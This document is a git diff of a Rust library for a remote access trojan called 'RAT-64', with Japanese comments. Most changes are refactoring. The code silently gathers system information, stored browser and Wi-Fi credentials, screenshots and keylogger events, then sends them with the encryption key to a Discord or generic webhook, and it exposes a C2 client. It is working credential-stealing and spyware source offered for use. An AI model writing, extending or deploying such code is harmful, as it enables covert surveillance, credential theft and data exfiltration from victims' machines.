@@ -1,5 +1,5 @@
 // RAT-64 Library - 統合されたモジュール構造（整理済み）
-use serde::{Serialize, Deserialize};
+use serde::{Deserialize, Serialize};
 
 // カスタムエラー型の定義
 #[derive(Debug)]
@@ -40,64 +40,76 @@ impl From<serde_json::Error> for RatError {
 pub type RatResult<T> = Result<T, RatError>;
 
 // 整理されたモジュールシステム
-pub mod core;        // 基本設定とコア機能
-pub mod collectors;  // データ収集機能
-pub mod network;     // ネットワーク通信機能  
-pub mod utils;       // ユーティリティ機能
-pub mod services;    // バックグラウンドサービス機能
-
-
+pub mod collectors;
+pub mod core;
+pub mod network;
+pub mod utils;
+pub mod services;
 
 // 公開API（新しいモジュール構造に対応）
-pub use core::{Config, load_config_or_default};
+pub use core::{load_config_or_default, Config};
 // Windows専用の収集系APIはWindowsのみ公開
 #[cfg(windows)]
 pub use collectors::{
-    SystemInfo, get_system_info, get_system_info_async, DiskInfo, NetworkInterface,
-    AuthData, collect_auth_data_with_config,
-    ScreenshotData, collect_screenshots,
-    get_profile_path, get_default_profile,
-    JsonCredentials, SqliteCredentials, NssCredentials, DecryptedLogin,
+    collect_auth_data_with_config,
     // Enhanced keylogger functions
-    collect_input_events_for, collect_input_events_structured,
-    save_session_to_file, load_session_from_file, get_daily_logs,
-    get_statistics, InputEvent, InputStatistics
+    collect_input_events_for,
+    collect_input_events_structured,
+    collect_screenshots,
+    get_daily_logs,
+    get_default_profile,
+    get_profile_path,
+    get_statistics,
+    get_system_info,
+    get_system_info_async,
+    load_session_from_file,
+    save_session_to_file,
+    AuthData,
+    DecryptedLogin,
+    DiskInfo,
+    InputEvent,
+    InputStatistics,
+    JsonCredentials,
+    NetworkInterface,
+    NssCredentials,
+    ScreenshotData,
+    SqliteCredentials,
+    SystemInfo,
 };
+pub use network::{upload_data_file, upload_multiple, UploadError, UploadResult, Uploader};
+pub use services::C2Client;
 pub use utils::{encrypt_data_with_key, generate_key_pair};
-pub use network::{UploadResult, UploadError, Uploader, upload_data_file, upload_multiple};
-pub use services::{C2Client};
 
 // メイン実行機能
 #[cfg(windows)]
 pub async fn execute_rat_operations(config: &Config) -> RatResult<String> {
     // システム情報収集（サイレント）
     let _ = get_system_info_async().await;
-    
+
     // 認証データ収集（サイレント）
     let _auth_data = collect_auth_data_with_config(config);
-    
+
     // スクリーンショット収集（サイレント）
     if config.collect_screenshots {
         let _screenshot_data = collect_screenshots(config);
     }
-    
+
     Ok(String::new())
 }
 
-// 統合データペイロード作成
+// 統合データペイロード（最適化版・後方互換性削除）
 #[cfg(windows)]
 #[derive(Serialize, Deserialize, Debug)]
 pub struct IntegratedPayload {
     pub system_info: SystemInfo,
     pub auth_data: AuthData,
     pub screenshot_data: Option<ScreenshotData>,
-    pub input_events: Option<Vec<String>>,    // 従来の入力イベントログ（互換性用）
-    pub input_events_structured: Option<Vec<InputEvent>>, // 新しい構造化入力データ
-    pub input_statistics: Option<InputStatistics>, // 入力統計情報
+    pub input_events_structured: Vec<InputEvent>, // 構造化入力データのみ（レガシー削除）
+    pub input_statistics: InputStatistics,        // 入力統計情報（必須）
     pub timestamp: String,
     pub session_id: String,
-    pub encryption_key: Option<String>,  // Base64エンコードされた暗号化キー
-    pub encryption_nonce: Option<String>, // Base64エンコードされたノンス
+    pub encryption_key: String, // Base64エンコードされた暗号化キー（必須）
+    pub encryption_nonce: String, // Base64エンコードされたノンス（必須）
 }
 
 #[cfg(windows)]
@@ -111,38 +123,51 @@ impl IntegratedPayload {
             None
         };
         // 入力イベント（Windowsのみ、3秒サンプリング）
-        #[cfg(windows)]
-        let (input_events, input_events_structured, input_statistics) = {
-            use crate::collectors::key_mouse_logger::{collect_input_events_for, collect_input_events_structured, get_statistics};
-            let structured = tokio::task::spawn_blocking(|| collect_input_events_structured(3000)).await.ok();
-            let legacy = tokio::task::spawn_blocking(|| collect_input_events_for(3000)).await.ok();
-            let stats = get_statistics();
-            (legacy, structured, stats)
+        let (input_events_structured, input_statistics) = {
+            use crate::collectors::key_mouse_logger::{
+                collect_input_events_structured, get_statistics,
+            };
+            let structured = tokio::task::spawn_blocking(|| collect_input_events_structured(3000))
+                .await
+                .unwrap_or_default();
+            let stats = get_statistics().unwrap_or_default();
+            (structured, stats)
         };
-        #[cfg(not(windows))]
-        let (input_events, input_events_structured, input_statistics) = (None, None, None);
+
+        // 暗号化キーとノンス生成（必須）
+        let mut key = [0u8; 32];
+        let mut nonce = [0u8; 12];
+        use rand::RngCore;
+        rand::rng().fill_bytes(&mut key);
+        rand::rng().fill_bytes(&mut nonce);
 
         Ok(IntegratedPayload {
             system_info,
             auth_data,
             screenshot_data,
-            input_events,
             input_events_structured,
             input_statistics,
             timestamp: chrono::Utc::now().to_rfc3339(),
             session_id: uuid::Uuid::new_v4().to_string(),
-            encryption_key: None,    // 後で設定
-            encryption_nonce: None,  // 後で設定
+            encryption_key: base64::Engine::encode(
+                &base64::engine::general_purpose::STANDARD,
+                &key,
+            ),
+            encryption_nonce: base64::Engine::encode(
+                &base64::engine::general_purpose::STANDARD,
+                &nonce,
+            ),
         })
     }
-    
-    // キーとノンスを設定するメソッド
-    pub fn set_encryption_info(&mut self, key: &[u8; 32], nonce: &[u8; 12]) {
-        self.encryption_key = Some(base64::Engine::encode(&base64::engine::general_purpose::STANDARD_NO_PAD, key));
-        self.encryption_nonce = Some(base64::Engine::encode(&base64::engine::general_purpose::STANDARD_NO_PAD, nonce));
+
+    // キーとノンスを更新するメソッド（オプション）
+    pub fn update_encryption_info(&mut self, key: &[u8; 32], nonce: &[u8; 12]) {
+        self.encryption_key =
+            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, key);
+        self.encryption_nonce =
+            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, nonce);
     }
 }
-
 
 // Webhook送信（統合版）
 #[cfg(windows)]
@@ -167,7 +192,11 @@ async fn send_discord_webhook(payload: &IntegratedPayload, config: &Config) -> R
     let public_ip = payload.system_info.public_ip.as_deref().unwrap_or("不明");
     let password_count = payload.auth_data.passwords.len();
     let wifi_count = payload.auth_data.wifi_creds.len();
-    let screenshot_count = payload.screenshot_data.as_ref().map(|s| s.total_count).unwrap_or(0);
+    let screenshot_count = payload
+        .screenshot_data
+        .as_ref()
+        .map(|s| s.total_count)
+        .unwrap_or(0);
 
     let embed = json!({
         "title": format!("🔥 RAT-64 データ収集 - {}", payload.system_info.hostname),
@@ -195,7 +224,7 @@ async fn send_discord_webhook(payload: &IntegratedPayload, config: &Config) -> R
                 "inline": false
             },
             {
-                "name": "🌐 ネットワーク情報", 
+                "name": "🌐 ネットワーク情報",
                 "value": format!("**ローカルIP**: {}\n**グローバルIP**: {}\n**タイムゾーン**: {}",
                     payload.system_info.local_ip,
                     public_ip,
@@ -215,15 +244,15 @@ async fn send_discord_webhook(payload: &IntegratedPayload, config: &Config) -> R
             {
                 "name": "🔐 暗号化情報",
                 "value": format!("**キー**: {}\n**ノンス**: {}",
-                    payload.encryption_key.as_deref().unwrap_or("未設定"),
-                    payload.encryption_nonce.as_deref().unwrap_or("未設定")
+                    payload.encryption_key,
+                    payload.encryption_nonce
                 ),
                 "inline": false
             }
         ],
         "footer": {
-            "text": format!("収集時刻: {} | セッションID: {}", 
-                payload.timestamp, 
+            "text": format!("収集時刻: {} | セッションID: {}",
+                payload.timestamp,
                 payload.session_id.chars().take(8).collect::<String>()
             )
         }
@@ -234,16 +263,33 @@ async fn send_discord_webhook(payload: &IntegratedPayload, config: &Config) -> R
     });
 
     let body = serde_json::to_string(&webhook_payload)?;
-    send_json_webhook(&config.webhook_url, body, "Discord Webhook", config.timeout_seconds).await
+    send_json_webhook(
+        &config.webhook_url,
+        body,
+        "Discord Webhook",
+        config.timeout_seconds,
+    )
+    .await
 }
 
 #[cfg(windows)]
 async fn send_generic_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
     let body = serde_json::to_string(payload)?;
-    send_json_webhook(&config.webhook_url, body, "Generic Webhook", config.timeout_seconds).await
+    send_json_webhook(
+        &config.webhook_url,
+        body,
+        "Generic Webhook",
+        config.timeout_seconds,
+    )
+    .await
 }
 
-async fn send_json_webhook(url: &str, body: String, context: &str, timeout_seconds: u64) -> RatResult<()> {
+async fn send_json_webhook(
+    url: &str,
+    body: String,
+    context: &str,
+    timeout_seconds: u64,
+) -> RatResult<()> {
     let url_owned = url.to_owned();
     let context_owned = context.to_owned();
     let join_context = context_owned.clone();
@@ -265,7 +311,10 @@ async fn send_json_webhook(url: &str, body: String, context: &str, timeout_secon
         .map_err(|e| RatError::Command(format!("{} Webhook送信エラー: {}", request_context, e)))?;
 
     if !(200..=299).contains(&response.status_code) {
-        return Err(RatError::Command(format!("{} Webhook送信失敗: {}", context_owned, response.status_code)));
+        return Err(RatError::Command(format!(
+            "{} Webhook送信失敗: {}",
+            context_owned, response.status_code
+        )));
     }
 
     Ok(())
@@ -277,4 +326,6 @@ pub fn get_local_ip() -> Option<String> {
     crate::collectors::system_info::get_primary_local_ip()
 }
 #[cfg(not(windows))]
-pub fn get_local_ip() -> Option<String> { None }
+pub fn get_local_ip() -> Option<String> {
+    None
+}
